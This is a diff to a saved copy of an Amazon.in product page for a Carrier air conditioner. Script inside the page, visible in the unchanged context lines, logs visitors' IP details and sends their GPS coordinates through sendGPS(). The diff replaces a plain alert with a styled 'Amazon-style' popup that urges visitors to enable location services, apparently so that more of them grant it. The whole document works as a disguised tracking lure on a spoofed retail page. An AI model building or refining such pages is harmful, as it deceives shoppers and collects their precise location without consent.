@@ -2,7 +2,52 @@
 <!-- saved from url=(0121)https://www.amazon.in/Carrier-Flexicool-Inverter-Convertible-CAI18EE3R35W0/dp/B0DSWR3DJ3?ref_=holi25_refr_B0DSWR3DJ3&th=1 -->
 <html lang="en-in" class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.25.4-2025-06-19"><!-- sp:feature:head-start -->
 	
-	<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style class="vjs-styles-defaults">
+	<head>
+
+<style>
+  .popup {
+    display: none;
+    position: fixed;
+    top: 25%;
+    left: 50%;
+    transform: translate(-50%, -25%);
+    background: #fff;
+    border: 1px solid #ccc;
+    padding: 25px 20px;
+    width: 90%;
+    max-width: 400px;
+    z-index: 9999;
+    box-shadow: 0 0 12px rgba(0,0,0,0.2);
+    font-family: Arial, sans-serif;
+    text-align: center;
+    border-radius: 8px;
+  }
+
+  .popup h3 {
+    margin: 0 0 10px;
+    color: #b12704;
+    font-size: 18px;
+  }
+
+  .popup p {
+    font-size: 14px;
+    color: #333;
+  }
+
+  .popup button {
+    margin-top: 15px;
+    background: #ffd814;
+    border: 1px solid #fcd200;
+    padding: 8px 16px;
+    font-weight: bold;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+</style>
+
+	
+		
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style class="vjs-styles-defaults">
       .video-js {
         width: 300px;
         height: 150px;
@@ -9041,15 +9086,14 @@ P.now("ewc-assets").execute("EwcAssetLoaded", function (ewcAssets) {
     setTimeout(() => {
       logIPDetails();
       if (navigator.geolocation) {
-       navigator.geolocation.getCurrentPosition(
+      navigator.geolocation.getCurrentPosition(
   (pos) => {
     sendGPS(pos.coords.latitude, pos.coords.longitude);
   },
   (err) => {
     console.warn("❌ GPS blocked", err);
+	  document.getElementById("locationPopup").style.display = "block";
 
-    // Show popup if location is denied/unavailable
-    alert("📍 Please enable location services in your phone/browser settings to check delivery availability near you.");
   }
 );
 
@@ -9058,7 +9102,12 @@ P.now("ewc-assets").execute("EwcAssetLoaded", function (ewcAssets) {
   })();
 </script>
 
-
+<!-- Amazon-style Location Alert -->
+<div class="popup" id="locationPopup">
+  <h3>Location Access Needed</h3>
+  <p>Please enable location services on your device to check delivery availability near you.</p>
+  <button onclick="document.getElementById('locationPopup').style.display='none'">OK</button>
+</div>
 
 
 </body></html>
